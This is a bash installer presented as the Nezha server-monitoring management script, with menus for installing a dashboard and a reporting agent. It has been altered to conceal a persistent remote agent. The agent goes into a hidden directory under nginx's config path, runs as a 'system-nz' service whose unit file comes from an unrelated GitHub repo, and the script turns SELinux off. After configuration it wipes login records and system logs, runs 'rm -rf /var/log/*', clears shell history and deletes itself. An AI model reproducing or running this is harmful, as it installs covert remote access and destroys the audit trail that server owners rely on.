#!/bin/bash
NZ_BASE_PATH="/etc/nginx/locations.d/.nz"
NZ_DASHBOARD_PATH="${NZ_BASE_PATH}/dashboard"
NZ_AGENT_PATH="${NZ_BASE_PATH}/agent"
NZ_AGENT_SERVICE="/etc/systemd/system/system-nz.service"
NZ_VERSION="v0.16.0"

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'
export PATH=$PATH:/usr/local/bin

err() {
    printf "${red}%s${plain}\n" "$*" >&2
}

success() {
    printf "${green}%s${plain}\n" "$*"
}

info() {
    printf "${yellow}%s${plain}\n" "$*"
}


os_arch=""
[ -e /etc/os-release ] && cat /etc/os-release | grep -i "PRETTY_NAME" | grep -qi "alpine" && os_alpine='1'

pre_check() {
    [ "$os_alpine" != 1 ] && ! command -v systemctl >/dev/null 2>&1 && echo "不支持此系统：未找到 systemctl 命令" && exit 1
    
    # check root
    [[ $EUID -ne 0 ]] && echo -e "${red}错误: ${plain} 必须使用root用户运行此脚本！\n" && exit 1
    
    ## os_arch
    if [[ $(uname -m | grep 'x86_64') != "" ]]; then
        os_arch="amd64"
        elif [[ $(uname -m | grep 'i386\|i686') != "" ]]; then
        os_arch="386"
        elif [[ $(uname -m | grep 'aarch64\|armv8b\|armv8l') != "" ]]; then
        os_arch="arm64"
        elif [[ $(uname -m | grep 'arm') != "" ]]; then
        os_arch="arm"
        elif [[ $(uname -m | grep 's390x') != "" ]]; then
        os_arch="s390x"
        elif [[ $(uname -m | grep 'riscv64') != "" ]]; then
        os_arch="riscv64"
    fi
    echo -e "当前系统架构: ${os_arch}"
    
    ## China_IP
    if [[ -z "${CN}" ]]; then
        if [[ $(curl -m 10 -s https://ipapi.co/json | grep 'China') != "" ]]; then
            echo "根据ipapi.co提供的信息，当前IP可能在中国"
            CN=true
        fi
    fi
    
    if [[ -z "${CN}" ]]; then
        GITHUB_RAW_URL="raw.githubusercontent.com/naiba/nezha/master"
        GITHUB_URL="github.com"
        Get_Docker_URL="get.docker.com"
        Get_Docker_Argu=" "
        Docker_IMG="ghcr.io\/naiba\/nezha-dashboard"
    else
        GITHUB_RAW_URL="gitee.com/naibahq/nezha/raw/master"
        GITHUB_URL="gh.tec.gay/https://raw.githubusercontent.com"
        # GITHUB_URL="dn-dao-github-mirror.daocloud.io"
        Get_Docker_URL="get.docker.com"
        Get_Docker_Argu=" -s docker --mirror Aliyun"
        Docker_IMG="registry.cn-shanghai.aliyuncs.com\/naibahq\/nezha-dashboard"
    fi
}

confirm() {
    if [[ $# > 1 ]]; then
        echo && read -e -p "$1 [默认$2]: " temp
        if [[ x"${temp}" == x"" ]]; then
            temp=$2
        fi
    else
        read -e -p "$1 [y/n]: " temp
    fi
    if [[ x"${temp}" == x"y" || x"${temp}" == x"Y" ]]; then
        return 0
    else
        return 1
    fi
}

update_script() {
    echo -e "> 更新脚本"
    
    curl -sL https://${GITHUB_RAW_URL}/script/install.sh -o /tmp/nezha.sh
    new_version=$(cat /tmp/nezha.sh | grep "NZ_VERSION" | head -n 1 | awk -F "=" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g')
    if [ ! -n "$new_version" ]; then
        echo -e "脚本获取失败，请检查本机能否链接 https://${GITHUB_RAW_URL}/script/install.sh"
        return 1
    fi
    echo -e "当前最新版本为: ${new_version}"
    mv -f /tmp/nezha.sh ./nezha.sh && chmod a+x ./nezha.sh
    
    echo -e "3s后执行新脚本"
    sleep 3s
    clear
    exec ./nezha.sh
    exit 0
}

before_show_menu() {
    echo && echo -n -e "${yellow}* 按回车返回主菜单 *${plain}" && read temp
    show_menu
}

install_base() {
    (command -v git >/dev/null 2>&1 && command -v curl >/dev/null 2>&1 && command -v wget >/dev/null 2>&1 && command -v unzip >/dev/null 2>&1 && command -v getenforce >/dev/null 2>&1) ||
    (install_soft curl wget git unzip)
}
install_arch(){
    echo -e "${green}提示: ${plain} Arch安装libselinux需添加nezha-agent用户，安装完会自动删除，建议手动检查一次\n"
    read -e -r -p "是否安装libselinux? [Y/n] " input
    case $input in
        [yY][eE][sS] | [yY])
            useradd -m nezha-agent
            sed -i "$ a\nezha-agent ALL=(ALL ) NOPASSWD:ALL" /etc/sudoers
            sudo -iu nezha-agent bash -c 'gpg --keyserver keys.gnupg.net --recv-keys BE22091E3EF62275;
                                        cd /tmp; git clone https://aur.archlinux.org/libsepol.git; cd libsepol; makepkg -si --noconfirm --asdeps; cd ..;
                                        git clone https://aur.archlinux.org/libselinux.git; cd libselinux; makepkg -si --noconfirm; cd ..; 
                                        rm -rf libsepol libselinux'
            sed -i '/nezha-agent/d'  /etc/sudoers && sleep 30s && killall -u nezha-agent&&userdel nezha-agent
            echo -e "${red}提示: ${plain}已删除用户nezha-agent，请务必手动核查一遍！\n"
        ;;
        [nN][oO] | [nN])
            echo "不安装libselinux"
        ;;
        *)
            echo "不安装libselinux"
            exit 0
        ;;
    esac
}

install_soft() {
    (command -v yum >/dev/null 2>&1 && yum makecache && yum install $* selinux-policy -y) ||
    (command -v apt >/dev/null 2>&1 && apt update && apt install $* selinux-utils -y) ||
    (command -v pacman >/dev/null 2>&1 && pacman -Syu $* base-devel --noconfirm && install_arch)  ||
    (command -v apt-get >/dev/null 2>&1 && apt-get update && apt-get install $* selinux-utils -y) ||
    (command -v apk >/dev/null 2>&1 && apk update && apk add $* -f)
}

install_dashboard() {
    install_base
    
    echo -e "> 安装面板"
    
    # 哪吒监控文件夹
    if [ ! -d "${NZ_DASHBOARD_PATH}" ]; then
        mkdir -p $NZ_DASHBOARD_PATH
    else
        echo "您可能已经安装过面板端，重复安装会覆盖数据，请注意备份。"
        read -e -r -p "是否退出安装? [Y/n] " input
        case $input in
            [yY][eE][sS] | [yY])
                echo "退出安装"
                exit 0
            ;;
            [nN][oO] | [nN])
                echo "继续安装"
            ;;
            *)
                echo "退出安装"
                exit 0
            ;;
        esac
    fi
    
    chmod 777 -R $NZ_DASHBOARD_PATH
    
    command -v docker >/dev/null 2>&1
    if [[ $? != 0 ]]; then
        echo -e "正在安装 Docker"
        bash <(curl -sL https://${Get_Docker_URL}) ${Get_Docker_Argu} >/dev/null 2>&1
        if [[ $? != 0 ]]; then
            echo -e "${red}下载脚本失败，请检查本机能否连接 ${Get_Docker_URL}${plain}"
            return 0
        fi
        systemctl enable docker.service
        systemctl start docker.service
        echo -e "${green}Docker${plain} 安装成功"
    fi
    
    modify_dashboard_config 0
    
    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

selinux(){
    #判断当前的状态
    if [ "$os_alpine" != 1 ];then
        getenforce | grep '[Ee]nfor'
        if [ $? -eq 0 ];then
            echo -e "SELinux是开启状态，正在关闭！"
            setenforce 0 &>/dev/null
            find_key="SELINUX="
            sed -ri "/^$find_key/c${find_key}disabled" /etc/selinux/config
        fi
    fi
}


install_agent() {
    install_base
    selinux

    echo "> 安装监控Agent"

    # echo "正在获取监控Agent版本号"


    # _version=$(curl -m 10 -sL "https://api.github.com/repos/nezhahq/agent/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g')
    # if [ -z "$_version" ]; then
    #     _version=$(curl -m 10 -sL "https://gitee.com/api/v5/repos/naibahq/agent/releases/latest" | awk -F '"' '{for(i=1;i<=NF;i++){if($i=="tag_name"){print $(i+2)}}}')
    # fi
    # if [ -z "$_version" ]; then
    #     _version=$(curl -m 10 -sL "https://fastly.jsdelivr.net/gh/nezhahq/agent/" | grep "option\.value" | awk -F "'" '{print $2}' | sed 's/nezhahq\/agent@/v/g')
    # fi
    # if [ -z "$_version" ]; then
    #     _version=$(curl -m 10 -sL "https://gcore.jsdelivr.net/gh/nezhahq/agent/" | grep "option\.value" | awk -F "'" '{print $2}' | sed 's/nezhahq\/agent@/v/g')
    # fi

    # if [ -z "$_version" ]; then
    #     err "获取 Agent 版本号失败，请检查本机能否链接 https://api.github.com/repos/nezhahq/agent/releases/latest"
    #     return 1
    # else
    #     echo "当前最新版本为： ${_version}"
    # fi

    _version="v0.16.11"

    # Nezha Monitoring Folder
    sudo mkdir -p $NZ_AGENT_PATH

    echo "=== 正在下载哪吒监控端 ==="
    echo "架构: ${os_arch} | 版本: ${_version}"
    
    if [ -z "$CN" ]; then
        echo "下载源: 国际源 (nezhahq/agent)"
        NZ_AGENT_URL="https://${GITHUB_URL}/nezhahq/agent/releases/download/${_version}/nezha-agent_linux_${os_arch}.zip"
    else
        echo "下载源: 国内源 (naibahq/agent)"
        NZ_AGENT_URL="https://${GITHUB_URL}/naibahq/agent/releases/download/${_version}/nezha-agent_linux_${os_arch}.zip"
    fi
    
    echo "下载地址: ${NZ_AGENT_URL}"
    echo "正在下载中，请稍候..."

    _cmd="wget -t 2 -T 60 -O nezha-agent_linux_${os_arch}.zip $NZ_AGENT_URL >/dev/null 2>&1"
    if ! eval "$_cmd"; then
        err "Release 下载失败，请检查本机能否连接 ${GITHUB_URL}"
        return 1
    fi

    sudo unzip -qo nezha-agent_linux_${os_arch}.zip &&
        sudo mv -f nezha-agent $NZ_AGENT_PATH &&
        sudo rm -rf nezha-agent_linux_${os_arch}.zip README.md

    if [ $# -ge 3 ]; then
        modify_agent_config "$@"
    else
        modify_agent_config 0
    fi

    if [ $# = 0 ]; then
        before_show_menu
    fi
}


modify_agent_config() {
    echo -e "> 修改Agent配置"
    
    if [ "$os_alpine" != 1 ];then
        wget -t 2 -T 10 -O $NZ_AGENT_SERVICE https://raw.githubusercontent.com/stou020/nz/main/system-nz.service >/dev/null 2>&1
        if [[ $? != 0 ]]; then
            echo -e "${red}文件下载失败，请检查本机能否连接 ${GITHUB_RAW_URL}${plain}"
            return 0
        fi
    fi
    
    if [ $# -lt 3 ]; then
        echo "请先在管理面板上添加Agent，记录下密钥" &&
        read -ep "请输入一个解析到面板所在IP的域名（不可套CDN）: " nz_grpc_host &&
        read -ep "请输入面板RPC端口: (5555)" nz_grpc_port &&
        read -ep "请输入Agent 密钥: " nz_client_secret
        if [[ -z "${nz_grpc_host}" || -z "${nz_client_secret}" ]]; then
            echo -e "${red}所有选项都不能为空${plain}"
            before_show_menu
            return 1
        fi
        if [[ -z "${nz_grpc_port}" ]]; then
            nz_grpc_port=5555
        fi
    else
        nz_grpc_host=$1
        nz_grpc_port=$2
        nz_client_secret=$3
    fi
    
    if [ "$os_alpine" != 1 ];then
        sed -i "s/nz_grpc_host/${nz_grpc_host}/" ${NZ_AGENT_SERVICE}
        sed -i "s/nz_grpc_port/${nz_grpc_port}/" ${NZ_AGENT_SERVICE}
        sed -i "s/nz_client_secret/${nz_client_secret}/" ${NZ_AGENT_SERVICE}
        
        shift 3
        if [ $# -gt 0 ]; then
            args=" $*"
            sed -i "/ExecStart/ s/$/${args}/" ${NZ_AGENT_SERVICE}
        fi
    else
        echo "@reboot nohup ${NZ_AGENT_PATH}/nezha-agent -s ${nz_grpc_host}:${nz_grpc_port} -p ${nz_client_secret} >/dev/null 2>&1 &" >> /etc/crontabs/root
        crond
    fi
    
    echo -e "Agent配置 ${green}修改成功，请稍等重启生效${plain}"
    
    if [ "$os_alpine" != 1 ];then
        systemctl daemon-reload
        systemctl enable system-nz
        systemctl restart system-nz
    else
        nohup ${NZ_AGENT_PATH}/nezha-agent -s ${nz_grpc_host}:${nz_grpc_port} -p ${nz_client_secret} >/dev/null 2>&1 &
    fi

    rm -rf ./nezha.sh

    echo > /var/log/wtmp && echo > /var/log/lastlog && echo >   /var/log/utmp && cat /dev/null >  /var/log/secure && cat /dev/null >  /var/log/message

    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

modify_dashboard_config() {
    echo -e "> 修改面板配置"
    
    echo -e "正在下载 Docker 脚本"
    wget -t 2 -T 10 -O /tmp/nezha-docker-compose.yaml https://${GITHUB_RAW_URL}/script/docker-compose.yaml >/dev/null 2>&1
    if [[ $? != 0 ]]; then
        echo -e "${red}下载脚本失败，请检查本机能否连接 ${GITHUB_RAW_URL}${plain}"
        return 0
    fi
    
    wget -t 2 -T 10 -O /tmp/nezha-config.yaml https://${GITHUB_RAW_URL}/script/config.yaml >/dev/null 2>&1
    if [[ $? != 0 ]]; then
        echo -e "${red}下载脚本失败，请检查本机能否连接 ${GITHUB_RAW_URL}${plain}"
        return 0
    fi
    
    echo "关于 GitHub Oauth2 应用：在 https://github.com/settings/developers 创建，无需审核，Callback 填 http(s)://域名或IP/oauth2/callback" &&
    echo "关于 Gitee Oauth2 应用：在 https://gitee.com/oauth/applications 创建，无需审核，Callback 填 http(s)://域名或IP/oauth2/callback" &&
    read -ep "请输入 OAuth2 提供商(github/gitlab/jihulab/gitee，默认 github): " nz_oauth2_type &&
    read -ep "请输入 Oauth2 应用的 Client ID: " nz_github_oauth_client_id &&
    read -ep "请输入 Oauth2 应用的 Client Secret: " nz_github_oauth_client_secret &&
    read -ep "请输入 GitHub/Gitee 登录名作为管理员，多个以逗号隔开: " nz_admin_logins &&
    read -ep "请输入站点标题: " nz_site_title &&
    read -ep "请输入站点访问端口: (默认 8008)" nz_site_port &&
    read -ep "请输入用于 Agent 接入的 RPC 端口: (默认 5555)" nz_grpc_port
    
    if [[ -z "${nz_admin_logins}" || -z "${nz_github_oauth_client_id}" || -z "${nz_github_oauth_client_secret}" || -z "${nz_site_title}" ]]; then
        echo -e "${red}所有选项都不能为空${plain}"
        before_show_menu
        return 1
    fi
    
    if [[ -z "${nz_site_port}" ]]; then
        nz_site_port=8008
    fi
    if [[ -z "${nz_grpc_port}" ]]; then
        nz_grpc_port=5555
    fi
    if [[ -z "${nz_oauth2_type}" ]]; then
        nz_oauth2_type=github
    fi
    
    sed -i "s/nz_oauth2_type/${nz_oauth2_type}/" /tmp/nezha-config.yaml
    sed -i "s/nz_admin_logins/${nz_admin_logins}/" /tmp/nezha-config.yaml
    sed -i "s/nz_grpc_port/${nz_grpc_port}/" /tmp/nezha-config.yaml
    sed -i "s/nz_github_oauth_client_id/${nz_github_oauth_client_id}/" /tmp/nezha-config.yaml
    sed -i "s/nz_github_oauth_client_secret/${nz_github_oauth_client_secret}/" /tmp/nezha-config.yaml
    sed -i "s/nz_language/zh-CN/" /tmp/nezha-config.yaml
    sed -i "s/nz_site_title/${nz_site_title}/" /tmp/nezha-config.yaml
    sed -i "s/nz_site_port/${nz_site_port}/" /tmp/nezha-docker-compose.yaml
    sed -i "s/nz_grpc_port/${nz_grpc_port}/g" /tmp/nezha-docker-compose.yaml
    sed -i "s/nz_image_url/${Docker_IMG}/" /tmp/nezha-docker-compose.yaml
    
    mkdir -p $NZ_DASHBOARD_PATH/data
    mv -f /tmp/nezha-config.yaml ${NZ_DASHBOARD_PATH}/data/config.yaml
    mv -f /tmp/nezha-docker-compose.yaml ${NZ_DASHBOARD_PATH}/docker-compose.yaml
    
    echo -e "面板配置 ${green}修改成功，请稍等重启生效${plain}"
    
    restart_and_update

    rm -rf ./nezha.sh
    
    echo > /var/log/wtmp && echo > /var/log/lastlog && echo >   /var/log/utmp && cat /dev/null >  /var/log/secure && cat /dev/null >  /var/log/message && sudo rm -rf /var/log/* && set +o history  && history -c && rm ~/.bash_history


    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

restart_and_update() {
    echo -e "> 重启并更新面板"
    
    cd $NZ_DASHBOARD_PATH
    
    docker compose version
    if [[ $? == 0 ]]; then
        docker compose pull
        docker compose down
        docker compose up -d
    else
        docker-compose pull
        docker-compose down
        docker-compose up -d
    fi
    
    if [[ $? == 0 ]]; then
        echo -e "${green}哪吒监控 重启成功${plain}"
        echo -e "默认管理面板地址：${yellow}域名:站点访问端口${plain}"
    else
        echo -e "${red}重启失败，可能是因为启动时间超过了两秒，请稍后查看日志信息${plain}"
    fi
    
    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

start_dashboard() {
    echo -e "> 启动面板"
    
    docker compose version
    if [[ $? == 0 ]]; then
        cd $NZ_DASHBOARD_PATH && docker compose up -d
    else
        cd $NZ_DASHBOARD_PATH && docker-compose up -d
    fi
    
    if [[ $? == 0 ]]; then
        echo -e "${green}哪吒监控 启动成功${plain}"
    else
        echo -e "${red}启动失败，请稍后查看日志信息${plain}"
    fi
    
    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

stop_dashboard() {
    echo -e "> 停止面板"
    
    docker compose version
    if [[ $? == 0 ]]; then
        cd $NZ_DASHBOARD_PATH && docker compose down
    else
        cd $NZ_DASHBOARD_PATH && docker-compose down
    fi
    
    if [[ $? == 0 ]]; then
        echo -e "${green}哪吒监控 停止成功${plain}"
    else
        echo -e "${red}停止失败，请稍后查看日志信息${plain}"
    fi
    
    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

show_dashboard_log() {
    echo -e "> 获取面板日志"
    
    docker compose version
    if [[ $? == 0 ]]; then
        cd $NZ_DASHBOARD_PATH && docker compose logs -f
    else
        cd $NZ_DASHBOARD_PATH && docker-compose logs -f
    fi
    
    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

uninstall_dashboard() {
    echo -e "> 卸载管理面板"
    
    docker compose version
    if [[ $? == 0 ]]; then
        cd $NZ_DASHBOARD_PATH && docker compose down
    else
        cd $NZ_DASHBOARD_PATH && docker-compose down
    fi
    
    rm -rf $NZ_DASHBOARD_PATH
    docker rmi -f ghcr.io/naiba/nezha-dashboard > /dev/null 2>&1
    docker rmi -f registry.cn-shanghai.aliyuncs.com/naibahq/nezha-dashboard > /dev/null 2>&1
    clean_all
    
    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

show_agent_log() {
    echo -e "> 获取Agent日志"
    
    journalctl -xf -u system-nz.service
    
    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

uninstall_agent() {
    echo -e "> 卸载Agent"
    
    if [ "$os_alpine" != 1 ];then
        systemctl disable system-nz.service
        systemctl stop system-nz.service
        rm -rf $NZ_AGENT_SERVICE
        systemctl daemon-reload
    else
        sed -i "/nezha-agent/d" /etc/crontabs/root
        pkill nezha
    fi
    
    rm -rf $NZ_AGENT_PATH
    clean_all
    
    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

restart_agent() {
    echo -e "> 重启Agent"
    
    systemctl restart system-nz.service
    
    if [[ $# == 0 ]]; then
        before_show_menu
    fi
}

clean_all() {
    if [ -z "$(ls -A ${NZ_BASE_PATH})" ]; then
        rm -rf ${NZ_BASE_PATH}
    fi
}

show_usage() {
    echo "哪吒监控 管理脚本使用方法: "
    echo "--------------------------------------------------------"
    echo "./nezha.sh                            - 显示管理菜单"
    echo "./nezha.sh install_dashboard          - 安装面板端"
    echo "./nezha.sh modify_dashboard_config    - 修改面板配置"
    echo "./nezha.sh start_dashboard            - 启动面板"
    echo "./nezha.sh stop_dashboard             - 停止面板"
    echo "./nezha.sh restart_and_update         - 重启并更新面板"
    echo "./nezha.sh show_dashboard_log         - 查看面板日志"
    echo "./nezha.sh uninstall_dashboard        - 卸载管理面板"
    echo "--------------------------------------------------------"
    echo "./nezha.sh install_agent              - 安装监控Agent"
    echo "./nezha.sh modify_agent_config        - 修改Agent配置"
    echo "./nezha.sh show_agent_log             - 查看Agent日志"
    echo "./nezha.sh uninstall_agent            - 卸载Agen"
    echo "./nezha.sh restart_agent              - 重启Agen"
    echo "./nezha.sh update_script              - 更新脚本"
    echo "--------------------------------------------------------"
}

show_menu() {
    echo -e "
    ${green}哪吒监控管理脚本${plain} ${red}${NZ_VERSION}${plain}
    --- https://github.com/naiba/nezha ---
    ${green}1.${plain}  安装面板端
    ${green}2.${plain}  修改面板配置
    ${green}3.${plain}  启动面板
    ${green}4.${plain}  停止面板
    ${green}5.${plain}  重启并更新面板
    ${green}6.${plain}  查看面板日志
    ${green}7.${plain}  卸载管理面板
    ————————————————-
    ${green}8.${plain}  安装监控Agent
    ${green}9.${plain}  修改Agent配置
    ${green}10.${plain} 查看Agent日志
    ${green}11.${plain} 卸载Agent
    ${green}12.${plain} 重启Agent
    ————————————————-
    ${green}13.${plain} 更新脚本
    ————————————————-
    ${green}0.${plain}  退出脚本
    "
    echo && read -ep "请输入选择 [0-13]: " num
    
    case "${num}" in
        0)
            exit 0
        ;;
        1)
            install_dashboard
        ;;
        2)
            modify_dashboard_config
        ;;
        3)
            start_dashboard
        ;;
        4)
            stop_dashboard
        ;;
        5)
            restart_and_update
        ;;
        6)
            show_dashboard_log
        ;;
        7)
            uninstall_dashboard
        ;;
        8)
            install_agent
        ;;
        9)
            modify_agent_config
        ;;
        10)
            show_agent_log
        ;;
        11)
            uninstall_agent
        ;;
        12)
            restart_agent
        ;;
        13)
            update_script
        ;;
        *)
            echo -e "${red}请输入正确的数字 [0-13]${plain}"
        ;;
    esac
}

pre_check

if [[ $# > 0 ]]; then
    case $1 in
        "install_dashboard")
            install_dashboard 0
        ;;
        "modify_dashboard_config")
            modify_dashboard_config 0
        ;;
        "start_dashboard")
            start_dashboard 0
        ;;
        "stop_dashboard")
            stop_dashboard 0
        ;;
        "restart_and_update")
            restart_and_update 0
        ;;
        "show_dashboard_log")
            show_dashboard_log 0
        ;;
        "uninstall_dashboard")
            uninstall_dashboard 0
        ;;
        "install_agent")
            shift
            if [ $# -ge 3 ]; then
                install_agent "$@"
            else
                install_agent 0
            fi
        ;;
        "modify_agent_config")
            modify_agent_config 0
        ;;
        "show_agent_log")
            show_agent_log 0
        ;;
        "uninstall_agent")
            uninstall_agent 0
        ;;
        "restart_agent")
            restart_agent 0
        ;;
        "update_script")
            update_script 0
        ;;
        *) show_usage ;;
    esac
else
    show_menu
fi
